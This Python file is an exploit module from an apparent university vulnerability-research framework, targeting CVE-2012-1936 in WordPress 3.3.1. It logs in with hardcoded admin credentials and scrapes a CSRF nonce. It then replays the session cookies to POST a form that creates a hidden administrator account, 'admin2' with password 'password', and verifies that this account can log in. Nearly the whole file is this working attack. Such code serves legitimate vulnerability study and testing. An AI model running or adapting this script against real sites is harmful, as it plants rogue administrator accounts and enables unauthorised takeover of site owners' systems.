
# Copyright 2013 University of Maryland.  All rights reserved.
# Use of this source code is governed by a BSD-style
# license that can be found in the LICENSE.TXT file.


import sys
import time
import urllib
import urllib2
import cookielib

import selenium.common.exceptions
import framework

class Exploit (framework.Exploit):

    attributes = {'Name' :        "CVE_2012_1936_B",
                  'Description' : "This exploit utilizes selenium to login as administrator, "
                                  "extract the _inline_edit CSRF token, as well as to get "
                                  "some valid session cookies. The POST request is "
                                  "constructed and sent using urllib",
                  'References' :  [['CVE', '2012-1936']],
                  'Target' :      "Wordpress 3.3.1",
                  'TargetLicense' : '',
                  'VulWikiPage' : "http://seamster.cs.umd.edu/vulwiki/index.php/CVE-2012-1936",
                  'Type' :        'CSRF'
                  }
                

    def __init__(self, visible=False):
        framework.Exploit.__init__(self, visible)
        return
            
    def exploit(self):
        driver = self.create_selenium_driver()
        driver.get("http://localhost/wordpress/wp-login.php")

        time.sleep(3)
        self.logger.info("Logging in as admin to retrieve secret CSRF tokens")
        driver.get_element(by_id="user_login").send_keys("wpadmin")
        driver.get_element(by_id="user_pass").send_keys("wpadminpw21")
        driver.get_element(by_id="wp-submit").click()
        

        try:

            # click on Users link
            driver.get_element(by_xpath="//a[@href='users.php']").click()
            # click on exposed Add New link
            time.sleep(3)
            driver.get_element(by_link_text="Add New").click()
            # scoop up secret key
            time.sleep(3)
            secret_key = driver.get_element(by_id="_wpnonce_create-user").get_attribute('value')

        except selenium.common.exceptions.NoSuchElementException:
            self.logger.error("NoSuchElementException: exiting...")
            cleanup()
            exit(-1)

        self.logger.info("Received CSRF token \"%s\" for _wpnonce_create-user", secret_key)
        self.logger.info("A user must be authenticated for this exploit to work, will proceed using the admin-session cookies")
        cookies = driver.get_cookies()

        form_data = {"action" : "createuser",
                     "_wpnonce_create-user" : str(secret_key),
                     "_wp_http_referer" : "%2Fwordpress%2Fwp-admin%2Fuser-new.php",
                     "user_login" : "admin2",
                     "email" : "admin2@admin.com",
                     "first_name" : "admin2@admin.com",
                     "last_name" : "",
                     "url" : "",
                     "pass1" : "password",
                     "pass2" : "password",
                     "role" : "administrator",
                     "createuser" : "Add+New+User+"}

        class AcceptAllCookiePolicy(cookielib.CookiePolicy):
            """This is a hack to bypass domain checks when adding cookies to the CookieJar"""
            rfc2965 = False
            def set_ok(self, cookie, request):
                return True
            def return_ok(self, cookie, request):
                return True

        cookie_jar = cookielib.CookieJar(policy=AcceptAllCookiePolicy())

        for cookie in cookies:
            cookie_jar.set_cookie(
                cookielib.Cookie(
                    version=0,
                    name=cookie['name'],
                    value=cookie['value'],
                    port='80',
                    port_specified=False,
                    domain=cookie['domain'],
                    domain_specified=False, #was true
                    domain_initial_dot=False,
                    path=cookie['path'],
                    path_specified=True,
                    secure=cookie['secure'],
                    expires=cookie['expiry'],
                    discard=False,
                    comment=None,
                    comment_url=None,
                    rest={'HttpOnly': None},
                    rfc2109=False))

        url = "http://localhost/wordpress/wp-admin/user-new.php"
        request = urllib2.Request(url, urllib.urlencode(form_data))
        cookie_jar.add_cookie_header(request)

        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(), #cookie_jar
                                      urllib2.HTTPHandler()) #debuglevel=1

        self.logger.info("Sending payload...")
        response = opener.open(request)
        self.logger.info("Done. You may now log in as admin2:password")

        driver.cleanup()
        return


    def verify(self):
        verified = False
        driver = self.create_selenium_driver()
        driver.get("http://localhost/wordpress/wp-login.php")

        driver.get_element(by_id="user_login").send_keys("admin2")
        driver.get_element(by_id="user_pass").send_keys("password")
        driver.get_element(by_id="wp-submit").click()

        try:
            driver.get_element(by_xpath="//div[@id='adminmenuback']")
            self.logger.info("Login success")
            verified = True
        except selenium.common.exceptions.NoSuchElementException:
            self.logger.info("Login failed")

        driver.cleanup()
        return verified
